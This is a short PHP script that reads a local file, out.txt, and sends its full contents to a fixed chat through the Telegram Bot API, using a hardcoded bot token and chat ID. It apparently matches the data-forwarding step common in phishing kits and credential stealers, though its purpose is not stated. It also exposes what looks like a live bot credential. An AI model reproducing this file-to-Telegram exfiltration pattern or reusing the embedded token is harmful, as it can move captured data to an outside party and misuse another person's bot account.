<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1174706728:AAEG89aoSlKTkz4-cI7aDBLZoBCleS1Nro4/sendMessage?chat_id=1219495648&text=$msg");
?>
